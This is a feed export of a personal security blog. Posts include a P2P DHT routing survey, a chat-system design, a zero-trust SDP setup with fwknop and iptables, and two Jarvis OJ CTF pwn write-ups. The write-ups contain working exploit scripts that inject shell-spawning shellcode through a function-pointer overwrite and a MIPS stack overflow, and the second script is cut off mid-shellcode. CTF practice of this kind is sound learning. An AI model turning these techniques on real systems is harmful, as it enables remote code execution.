align="center">O(log<sub>2</sub>⁡N)</td></tr><tr><td align="center">CAN</td><td align="center">O(d)</td><td align="center">O(d)</td><td align="center">dN<sup>1&#x2F;d</sup></td></tr></tbody></table><p>Illustration:</p><ul><li>b is the length of the identifier.</li><li>N is the scale of the network.</li><li>d is the dimension of coordinate space.</li></ul><h2 id="4-Conclusions-and-Future-Directions"><a href="#4-Conclusions-and-Future-Directions" class="headerlink" title="4.Conclusions and Future Directions"></a>4.Conclusions and Future Directions</h2><p>At this stage, the main research work is around the current algorithm, which shows that the current routing and location algorithms need to be further improved. The delay of searching in chord network and the fault-tolerant mechanism in case of failure nodes need to be improved. When malicious nodes appear in can network, the validity of data also needs to be improved. Now a lot of research is to improve the existing Chord, Pastry, Tapestry and CAN network algorithm. But at present, there are also some new network structures and corresponding algorithms based on the existing network algorithms and combining the advantages of several algorithms.</p><p>Another research hotspot is to improve the performance of overlay network by using the physical distribution characteristics of nodes. Because in the above four network structures, the logical ID of the node in the overlay network is obtained by hashing according to the information of the node, which basically ignores the physical distribution characteristics of the node. Many new studies have improved and perfected this aspect.</p><p>There are two directions for successful P2P applications. One is blockchain applications, such as bitcoin. The other is file sharing applications, such as BitTorrent. The application prospect of overlay network is very bright, and the problems to be solved are also prominent and urgent. Therefore, further research in this field will be very valuable.</p><h2 id="5-References"><a href="#5-References" class="headerlink" title="5.References"></a>5.References</h2><ul><li><p>[1]Coulouris, G. ,  Dollimore, G. ,  Kindberg, J. , &amp;  Blair, T. . (2012). Distributed Systems: Concepts and Design (5th Edition).</p></li><li><p>[2]Chen, G. ,  Xu, C. Z. ,  Shen, H. , &amp;  Chen, D. . (2003). P2P Overlay Networks of Constant Degree. Grid &amp; Cooperative Computing, Second International Workshop, Gcc, Shanghai, China, December, Revised Papers.</p></li><li><p>[3]Stoica, I. ,  Morris, R. T. ,  Karger, D. ,  Kaashoek, F. , &amp;  Balakrishnan, H. . (2001). Chord : a scalable peer-to-peer lookup service for internet applications. ACM SIGCOMM Computer Communication Review, 31.</p></li><li><p>[4]Peng, X. Y., Yang, S. B., &amp; Chen, D. F.. (2004). Mcan:  A Scalable Modified Content -Addressable Network. Computer Science (11), 130-134.</p></li><li><p>[5]（2006). Analysis of structured P2P overlay networks algorithms based on DHT. Journal of Chongqing University, 000(0z1), 131-134.</p></li><li><p>[6]Yang, Y. H. . (2014). Compare with Algorithms of P2P Resource Location based on DHT. Information Security and Technology.</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Abstract] P2P (Peer-to-Peer) overlay network is one of the most popular distributed networks. It not only has advantages in scalability, but also can maximize the use of computing and storage resources of each terminal nodes. In the last ten years, P2P system is a hot topic in IT field. Recently, most researchers study structed P2P system, which is better than the former P2P structure. This paper focus on the routing algorithms based on DHT in second generation of P2P overlay networks.&lt;/p&gt;</summary>
    
    
    
    <category term="Security Framework" scheme="https://coldwave96.github.io/categories/Security-Framework/"/>
    
    <category term="P2P" scheme="https://coldwave96.github.io/categories/Security-Framework/P2P/"/>
    
    
    <category term="Routing" scheme="https://coldwave96.github.io/tags/Routing/"/>
    
    <category term="Peer-to-Peer" scheme="https://coldwave96.github.io/tags/Peer-to-Peer/"/>
    
  </entry>
  
  <entry>
    <title>A Simple Chat System</title>
    <link href="https://coldwave96.github.io/2021/09/17/ChatSystem/"/>
    <id>https://coldwave96.github.io/2021/09/17/ChatSystem/</id>
    <published>2021-09-17T07:38:03.000Z</published>
    <updated>2021-09-17T07:38:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>This is a simple example of distributed system implementation.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The project is to create a C&#x2F;S architectural model-based chat system. The chat system consists of a chat server and one or more chat clients. The chat server is able to accept multiple incoming TCP connections. The chat server can create a new chat room and move between existing chat rooms. Messages sent by a chat client will be broadcast to all clients which are in the same chat room.</p><h2 id="2-Protocol-Implementation"><a href="#2-Protocol-Implementation" class="headerlink" title="2.Protocol Implementation"></a>2.Protocol Implementation</h2><p>There are 8 protocols needs to be implemented in this chat system. At the beginning when a client connects to the server, the server will response with some initialized messages. After the socket is established, the client would be able to change identity, join rooms, ask for room list and room content information, create room, delete room, send messages, and quit the service. The following figures show how the server and client react to the eight protocols.</p><p><img src="/img/ChatSystem/Picture1.png" alt="Protocol diagram of the chat server"></p><p><img src="/img/ChatSystem/Picture2.png" alt="Protocol diagram of the chat client"></p><h3 id="2-1-Initialization"><a href="#2-1-Initialization" class="headerlink" title="2.1.Initialization"></a>2.1.Initialization</h3><p>The server will listen to the specified port. Once a client connects to the server, the server will start a thread to handle this socket and do following things:</p><ul><li>1.Responds with NewIdentity message.</li><li>2.Moves the client into MainHall.</li><li>3.Sends RoomChange message to all the clients in the MainHall.</li><li>4.Sends RoomList message to the client.</li><li>5.Sends RoomContent message to the client.</li></ul><p>Illustrated by the following figure:</p><p><img src="/img/ChatSystem/Picture3.png" alt="Initialization between the server and clients"></p><h3 id="2-2-Identity-Change-Protocol"><a href="#2-2-Identity-Change-Protocol" class="headerlink" title="2.2.Identity Change Protocol"></a>2.2.Identity Change Protocol</h3><p>When client sends a IdentityChange message to the server, the server will respond with a NewIdentity message. If the client wants to change to an invalid or existed identity, the value of former and identity field in NewIdentity message is same. And this NewIdentity message is only sent to the corresponding client. Otherwise, server will broadcast this NewIdentity message to all clients in the same chat room.</p><p><img src="/img/ChatSystem/Picture4.png" alt="Identity Change Protocol between the server and clients"></p><h3 id="2-3-Join-Room-Protocol"><a href="#2-3-Join-Room-Protocol" class="headerlink" title="2.3.Join Room Protocol"></a>2.3.Join Room Protocol</h3><p>When client sends a Join message to the server, the server will respond with a RoomChange message. If the client wants to join an invalid or non-existed room, the value of former and roomid in RoomChange message is same. And this RoomChange message is only sent to the corresponding client. Otherwise, server will broadcast this RoomChange message to all clients in the former and changed room. If client joins the MainHall, server will also send RoomList message and RoomComtents message after RoomChange message.</p><p><img src="/img/ChatSystem/Picture5.png" alt="Join Room Protocol between the server and clients"></p><h3 id="2-4-Create-Room-Protocol"><a href="#2-4-Create-Room-Protocol" class="headerlink" title="2.4.Create Room Protocol"></a>2.4.Create Room Protocol</h3><p>When client sends a CreateRoom message, the server will respond with a RoomList message. If the client wants to create a valid room, the server will respond with a RoomList message with the new room in the list.</p><p><img src="/img/ChatSystem/Picture6.png" alt="Create Room Protocol between the server and clients"></p><h3 id="2-5-Room-Content-Protocol"><a href="#2-5-Room-Content-Protocol" class="headerlink" title="2.5.Room Content Protocol"></a>2.5.Room Content Protocol</h3><p>When client sends a Who message, the server will respond with a RoomContents Message.</p><p><img src="/img/ChatSystem/Picture7.png" alt="Room Content Protocol between the server and clients"></p><h3 id="2-6-Room-List-Protocol"><a href="#2-6-Room-List-Protocol" class="headerlink" title="2.6.Room List Protocol"></a>2.6.Room List Protocol</h3><p>When client sends a List message, the server will respond with a RoomList message.</p><p><img src="/img/ChatSystem/Picture8.png" alt="Room List Protocol between the server and clients"></p><h3 id="2-7-Message-Protocol"><a href="#2-7-Message-Protocol" class="headerlink" title="2.7.Message Protocol"></a>2.7.Message Protocol</h3><p>When client input anything except for the commands, the client will take the input as messages and send the Message to the server. Then server will broadcast the Message to all clients in the same room.</p><p><img src="/img/ChatSystem/Picture9.png" alt="Message Protocol between the server and clients"></p><h3 id="2-8-Delete-Room-Protocol"><a href="#2-8-Delete-Room-Protocol" class="headerlink" title="2.8.Delete Room Protocol"></a>2.8.Delete Room Protocol</h3><p>When client sends Delete message, the server will do the following things:</p><ul><li>1.Check whether the room is existed, and the owner is the client or not.</li><li>2.If all conditions are met, server will move all users in that room to the MainHall and delete the room. Also, the server will send RoomChange message as well as RoomList message and RoomContents message to these clients.</li><li>3.Send RoomList message to the client which want to delete a room.</li></ul><p><img src="/img/ChatSystem/Picture10.png" alt="Delete Room Protocol between the server and client"></p><h3 id="2-9-Quit-Protocol"><a href="#2-9-Quit-Protocol" class="headerlink" title="2.9.Quit Protocol"></a>2.9.Quit Protocol</h3><p>Client just sends a Quit message to the server then shut down the program. If the client owns a room, then the server will remove the owner of this room. After that server will remove this client from its current room and check if it is the last client in that room. Server will delete that room if that room is empty, and its owner is also disconnected from the server. At last server removes the client socket from the socket list.</p><h2 id="3-Discussion-About-Concurrency"><a href="#3-Discussion-About-Concurrency" class="headerlink" title="3.Discussion About Concurrency"></a>3.Discussion About Concurrency</h2><p>Concurrency is an important feature of distributed system. Both services and applications provide resources that can be shared by clients in a distributed system. In this chat system, some concurrency has been realized, but there are also some problems have not been resolved when dealing with some concurrency.</p><p>First let’s discuss about the concurrency that the system has implemented. When the server starts, it will listen on the specified port. Once there is a socket connection request from the client, the server will create a new thread to process it. At the same time, the main program of the server is still listening to the specified port and waiting for a new socket connection request from another client. Different socket connections are processed by different threads and do not interfere with each other, so services and applications allow multiple client requests to be processed concurrently.</p><p>However, the concurrency implemented in this system is extremely limited. Next let’s discuss the limitation of the current system. First, the system does not consider high concurrency. After the client establishes a socket connection with the server, the thread handling the socket connection will run until the client actively exits the system. Although threads may occupy very few resources, the performance of the server is limited, and thread resources are limited as well. This will make it difficult for the system to deal with high concurrency. Second, there is no lock mechanism for access to shared resources in the system. Therefore, theoretically, different processes may operate on the same resource at the same time, which may lead to conflicts and inconsistent results. For example, if two users want to create a room with the same name at the same time, unpredictable error results may occur. Therefore, lock mechanism should be introduced to ensure the safe use of shared resources in a concurrent environment.</p><p>Similarly, the client also processes its socket connection with the server by thread. The client needs to listen to the user’s input and process the messages sent by the server at any time. This is the concurrency problem faced by the client. However, this chat system does not solve this problem, but processes user input and server pushed messages in the same thread. It may take two threads to deal with these two things separately. Then, like the server, this processing method also faces the same problem of accessing shared resource. In addition, if the user is entering something and the server pushes a message, it is also a problem how the separate thread scheme handles the situation.</p><h2 id="4-Multi-server-Architecture-Design"><a href="#4-Multi-server-Architecture-Design" class="headerlink" title="4.Multi-server Architecture Design"></a>4.Multi-server Architecture Design</h2><p>For a multi-server chat system, we have to do the following:</p><ul><li>1.High availability: No single node failure should cause service unavailability.</li><li>2.Easy to scale: Horizontally scalable, with the ability to adapt to different amounts of online users.</li><li>3.High concurrency and low latency: Be able to support a large number of users sending and receiving messages at the same time, with a delay of milliseconds from the message being sent to the delivery of all online ends.</li><li>4.Client compatibility: New applications are able to interoperate across multiple devices at the same time, such as web, mobile and desktop, and even smart TV.<br>Thus, the overall framework design is shown in the figure below.</li></ul><p><img src="/img/ChatSystem/Picture11.png" alt="The overall framework design of multi-server chat system"></p><p>The client layer is supposed to deal with compatibility issues with various devices, message channel management and maintenance, and data security.</p><p>The diversity of client implementation technologies leads to differences in the underlying data communication protocols between the client and the gateway. Therefore, the gateway layer is responsible for managing client connections, protocol conversion, logic for data security and efficient distribution of broadcast messages.</p><p>In addition to serving as a relay point for messages, the routing layer also assumes the role of load balancing and high availability. It is easier to expand capacity when the processing capacity of a single business node reaches a bottleneck. When a network failure occurs in a server cluster, it can be switched to the backup server cluster to ensure service availability.</p><p>The server layer handles the business messages of the chat system.<br>Now let’s deep dive into the multi-server chat system and focus on the message protocols.</p><p>For the client, it will try to connect to the gateway depending on the distance of the gateway in the list. Once the TCP keepalive connection established, the server can do the same thing as the current chat client.</p><p>There are two options for handling the communication between servers at router layer.</p><p>First option is to provide a master server. The master server has a router table. All messages are pushed to the master server, which distributes the messages to different service servers according to the router table. This places a high demand on the performance of the master server.</p><p>Another option is to implement a message queue based on a publish-subscribe system. The basic structure is shown in the figure bellow.</p><p><img src="/img/ChatSystem/Picture12.png" alt="Cross-server communication via message queues"></p><p>Assume there is a client 1 login in at the ChatServer 1 and a client 2 login in at the ChatServer 2. ChatServer 1 and ChatServer 2 will subscribe to messages about “client 1” and “client 2”in the message queue respectively. If client 2 sends a message to client 1, the ChatServer 2 will publish the message with a flag “client 1” to the message queue. Then message queue will notify ChatServer 1 that someone sends a message to client 1. Chatserver 1 will access this message and send it to client 1.</p><p>Message queues also have disadvantages. First, once the message queue crashed, so doed the entire system. Second, message queue makes the system more complex. How to ensure that messages are not consumed repeatedly? How to deal with the case of message loss? How to ensure the sequential nature of message delivery? These are the challenges that need to be addressed. Finally, there is the issue of consistency. If a request requires multiple operations, but one of them fails. Although the feedback to the user is success, the request is actually not fully executed. In general, however, the advantages of message queues outweigh the disadvantages, so it is a better choice than the first option.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;This is a simple example of distributed system implementation.&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Java" scheme="https://coldwave96.github.io/categories/Program/Java/"/>
    
    
    <category term="Github" scheme="https://coldwave96.github.io/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>开源组件实现 Software Defined Perimeter</title>
    <link href="https://coldwave96.github.io/2021/06/08/SoftwareDefinedPerimeter/"/>
    <id>https://coldwave96.github.io/2021/06/08/SoftwareDefinedPerimeter/</id>
    <published>2021-06-08T01:03:22.000Z</published>
    <updated>2021-06-08T01:03:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>零信任安全是当下一个比较火热的话题，很多厂家都在尝试将其落地，整合到企业安全框架之中，实现产品化。零信任安全其中一种比较可行的实现方案是通过SDP(Software Defined Perimeter)，本文尝试通过现有的开源组件实现SDP。</p><span id="more"></span><h2 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h2><p>本次尝试主要参考以下模型：</p><ul><li><p><a href="https://www.beyondcorp.com/">Google’s BeyondCorp</a></p></li><li><p><a href="https://cloudsecurityalliance.org/group/software-defined-perimeter/#_overview">Cloud Security Alliance model of Software Defined Perimeter</a></p></li></ul><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h2><p><a href="http://www.cipherdyne.org/">fwknop</a> - Used to allow the SDP server to remain completely hidden from unauthorized use.  With this tool, the gateway server can be configured with 0 inbound port access.  The net result is that the gateway server is more hardened against port scanning, DDoS attacks, etc.  This component will be optional as the client component is not readily available on all major platforms (ie. iPhone).  This project is definitely worth a look for anyone looking to contribute to a really awesome open source project!</p><p><a href="http://www.squid-cache.org/">Squid</a> - Used to provide authorization to upstream resources.  Squid is being used because of it’s ability to use external authentication helpers and assign access based on group memberships from either a common database, or LDAP server.  Squid also gives us the granularity to apply rules based on destination host, URI, port or a combination.</p><h2 id="测试拓扑"><a href="#测试拓扑" class="headerlink" title="测试拓扑"></a>测试拓扑</h2><p><img src="/img/SDP/SDP1.png" alt="测试拓扑图"></p><h2 id="方案简述"><a href="#方案简述" class="headerlink" title="方案简述"></a>方案简述</h2><p>网络边界部署边界服务器，在边界服务器上安装Squid反向代理内网Web服务。同时在边界服务器上安装并开启fwknop-server，在客户端上安装fwknop-client，通过配置实现单包认证访问。</p><h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>网络拓扑比较简单，就不赘述搭建过程，进入正题。在内网Web服务器上搭建HTTP网站，关于如何在Winserver 2008 R2上搭建网站也很简单就直接跳过。现在我们搭建好的网站是这样的：</p><p><img src="/img/SDP/SDP2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>在边界服务器上安装Squid，由于本次边界服务器是Ubuntu系统，所以输入<code>sudo apt isntall squid</code>即可。然后通过<code>sudo vim /etc/squid/squid.conf</code>命令修改squid的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#http_port 3128</span><br><span class="line">http_port 10.0.0.11:80 accel vhost vport</span><br><span class="line">cache_peer 192.168.88.10 parent 80 0 no-query no_digest originserver</span><br></pre></td></tr></table></figure><p>修改完成后通过<code>sudo systemctl restart squid</code>命令重启squid，这时候访问<code>http://10.0.0.11</code>就可以看到Step 1中搭建的网站。至此，HTTP反向代理就完成了。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>本次测试选用的客户端是Ubuntu，直接通过<code>sudo apt install fwknop-client</code>即可安装fwknop的客户端，本次测试安装的是2.6.9版本。如果是Windows端则要去<a href="http://www.cipherdyne.org/">fwknop官网</a>去下载源代码自行编译。</p><p>安装好fwknop-client之后执行<code>sudo fwknop -A tcp/80 -a 10.0.0.14 -D 10.0.0.11 --key-gen --use-hmac --save-rc-stanza</code>生成单包认证的Key。命令执行完之后会生成一个<code>.fwknoprc</code>文件，同时会告知文件位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A tcp/80           请求服务端打开的端口及其协议；</span><br><span class="line">-a 10.0.0.14        客户端的IP地址；</span><br><span class="line">-D 10.0.0.11        服务端的IP地址；</span><br><span class="line">-key-gen            生成一个加密密钥；</span><br><span class="line">--use-hmac          采用hmac加密认证方式；</span><br><span class="line">--save-rc-stanza    保存以上参数的执行结果。</span><br></pre></td></tr></table></figure><p>通过<code>sudo grep KEY /home/User/.fwknoprc</code>命令即可获取Key。</p><p><img src="/img/SDP/SDP3.png"></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>在边界服务器上通过<code>sudo apt install fwknop-server</code>安装fwknop服务端。然后输入<code>sudo vim /etc/fwknop/access.conf</code>修改服务端参数，将Step 3中客户端的Key加入配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOURCE                 ANY</span><br><span class="line">REQUIRE_SOURCE_ADDRESS Y</span><br><span class="line">OPEN_PORTS             tcp/80</span><br><span class="line">KEY_BASE64             rvyA5SgenTMOagiBJJER4otC+6hdbOxXSZKW8ZN7Bsk=</span><br><span class="line">HMAC_KEY_BASE64        MtCbW46/8PCOLk7BImbLhtwSuXbPmCIyecZvmuY5Nx8NQ1PLrrqgEEumgq7YjhDXS6cpwHX/wbZ6ZckoX6dI4A==</span><br></pre></td></tr></table></figure><p>然后还需要修改<code>/etc/feknop/fwknopd.conf</code>文件，将监听的网卡修改为机器外网网卡：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Define the ethernet interface on which we will sniff packets.</span><br><span class="line"># Default if not set is eth0.  The &#x27;-i &lt;intf&gt;&#x27; command line option overrides</span><br><span class="line"># the PCAP_INTF setting.</span><br><span class="line">#</span><br><span class="line">PCAP_INTF                   ens33;</span><br></pre></td></tr></table></figure><p>最后通过iptables实现对80端口的隐藏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT 1 -i ens33  -p tcp --dport 80 -j DROP</span><br><span class="line">sudo iptables -I INPUT 1 -i ens33 -p tcp --dport 80 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure><p>运行<code>sudo fwknopd reload</code>命令重启fwknopd服务，可通过<code>sudo fwknopd -S</code>命令查看服务状态，通过<code>sudo fwknopd --fw-list-all</code>命令查看iptables规则。</p><p>这样边界服务器的设置就完成了。</p><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>此时所有地址都无法访问边界服务器的HTTP服务，nmap扫描的结果如下：</p><p><img src="/img/SDP/SDP4.png"></p><p>而当我们在client上执行<code>sudo fwknop -n 10.0.0.11</code>命令发送单包认证后，会发现此时80端口已经对client开放（如果不做任何操作30s后会自动关闭，更多配置在服务端的fwknop配置文件中）：</p><p><img src="/img/SDP/SDP5.png"></p><p>这个时候client就可以访问到搭建在内网的HTTP服务了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结合下面的代理工具我们可以实现一些自动化以及非Web服务的单包认证机制。</p><p><a href="https://openvpn.net/index.php/open-source.html">OpenVPN</a> - Used to ensure a completely encrypted communication channel between personal devices (laptop, cell phone, etc) and the gateway server.  OpenVPN includes support on every major platform and is simple to adjust the configuration to the user’s needs.  In our model, we are not using OpenVPN in the traditional sense of a VPN as the gateway server will not be configured to forward traffic directly to an upstream device.  OpenVPN also supports additional authentication plugins allowing things like two-factor authentication to become possible. OpenVPN also provides the awesome PKI tool easy-rsa. easy-rsa gives us the ability to provision and manage certificates for all of our components.</p><p><a href="https://github.com/darkk/redsocks">Redsocks Proxy</a> - This tool will be used to forward non-web traffic through our Squid proxy.</p><p>以及更多的fwknop指导在<a href="http://www.cipherdyne.org/fwknop/docs/fwknop-tutorial.html">这里</a>。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;零信任安全是当下一个比较火热的话题，很多厂家都在尝试将其落地，整合到企业安全框架之中，实现产品化。零信任安全其中一种比较可行的实现方案是通过SDP(Software Defined Perimeter)，本文尝试通过现有的开源组件实现SDP。&lt;/p&gt;</summary>
    
    
    
    <category term="Security Framework" scheme="https://coldwave96.github.io/categories/Security-Framework/"/>
    
    <category term="Zero Trust" scheme="https://coldwave96.github.io/categories/Security-Framework/Zero-Trust/"/>
    
    
    <category term="Zero Trust" scheme="https://coldwave96.github.io/tags/Zero-Trust/"/>
    
    <category term="SDP" scheme="https://coldwave96.github.io/tags/SDP/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Calcexe の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/02/04/Calcexe/"/>
    <id>https://coldwave96.github.io/2021/02/04/Calcexe/</id>
    <published>2021-02-04T03:28:26.000Z</published>
    <updated>2021-02-04T03:28:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>题目捎带迷惑性，文件后缀为<code>.exe</code>，看起来是windows下的运行程序，结果在windows上根本无法运行。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec：</p><p><img src="/img/Calcexe/Calcexe1.png"></p><p>依然是32位的ELF文件。</p><p>将程序在IDA中打开，在main函数中发现定义了10个功能：</p><p><img src="/img/Calcexe/Calcexe2.png"></p><p>这是功能申明函数sub_804A719：</p><p><img src="/img/Calcexe/Calcexe3.png"></p><p>所以程序运行是这样的：</p><p><img src="/img/Calcexe/Calcexe4.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>由于程序很长，所以就挑选关键部分来说。 程序申明了10个函数，如果能够控制这些函数的指针那么就可以控制程序跳转执行shellcode。</p><p>而在主函数后发现处理function的函数：</p><p><img src="/img/Calcexe/Calcexe5.png"></p><p><code>strtok()</code>是分割字符串的函数，这里用来处理空格。0x61是<code>&#39;=&#39;</code>，0x34是<code>&#39;“&#39;</code>，所以根据伪代码发现程序允许通过<code>var</code>参数声明变量，命令格式为<code>var variable = “value”</code>。</p><p>这一段程序中还提到了下面的函数：</p><p><img src="/img/Calcexe/Calcexe6.png"></p><p>分析sub_804A820函数发现程序寻址是通过比较变量名实现的，所以即使<code>var add = “eval”</code>也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的method改成shellcode即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9892)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = &#x27;var add = &quot;&#x27;+ shellcode + &#x27;&quot;&#x27;</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;&gt;&quot;, payload)</span><br><span class="line">sh.sendline(&#x27;+&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Calcexe/Calcexe7.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;题目捎带迷惑性，文件后缀为&lt;code&gt;.exe&lt;/code&gt;，看起来是windows下的运行程序，结果在windows上根本无法运行。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Add の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/01/28/Add/"/>
    <id>https://coldwave96.github.io/2021/01/28/Add/</id>
    <published>2021-01-28T02:35:37.000Z</published>
    <updated>2021-01-28T02:35:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec发现是MIPS架构的32位程序：</p><p><img src="/img/Add/Add1.png"></p><p>连接到服务器端看下程序运行逻辑：</p><p><img src="/img/Add/Add2.png"></p><p>看起来是个简单的加法计算器。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>Ghidra反编译看下main函数的代码：</p><p><img src="/img/Add/Add3.png"></p><p><img src="/img/Add/Add4.png"></p><p>结合retdec反编译的C代码：</p><p><img src="/img/Add/Add5.png"></p><p>在LAB_00400b18中有这样一个片段：</p><p><img src="/img/Add/Add6.png"></p><p>根据main函数的代码发现buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题。</p><p>上图中片段可以实现打印buf的地址，想要执行这个功能需要满足buf和challenge相等，buf是由我们控制的。</p><p>&amp;emsp;&amp;emspchallenge表面上是rand()生成的随机数，但是由于随机种子是由srand(0x123456)生成的，即为固定值，导致challenge也是固定值。</p><p>通过上面的分析我们可以得到栈上buf的地址，加上程序没有NX保护。所以当在buf中布置好shellcode控制程序跳转执行即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>利用cyclic生成200个字节，通过调试发现溢出偏移量为112即0x70。这里要注意只有退出程序才会回到返回地址，所以最后需要一个退出的操作。</p><p>另外在调试中发现如果直接部署在buf上，在shellcode中指令会将&#x2F;bin&#x2F;sh字符串修改导致get shell 失败。所以需要将shellcode再偏移4或8和字节。</p><p>利用msfvenom生成payload：</p><p><img src="/img/Add/Add7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>下面是PWN脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import CDLL</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9889)</span><br><span class="line"></span><br><span class="line">dll = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">dll.srand(0x123456)</span><br><span class="line">key = dll.rand()</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;help.\n&quot;, str(key))</span><br><span class="line">sh.recvuntil(&quot;Your input was&quot;)</span><br><span class="line">stack_addr = int(sh.recvline().strip(), 16)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span><br><span class="line">buf += b&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span><br><span class="line">buf += b&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span><br><span class="line">buf += 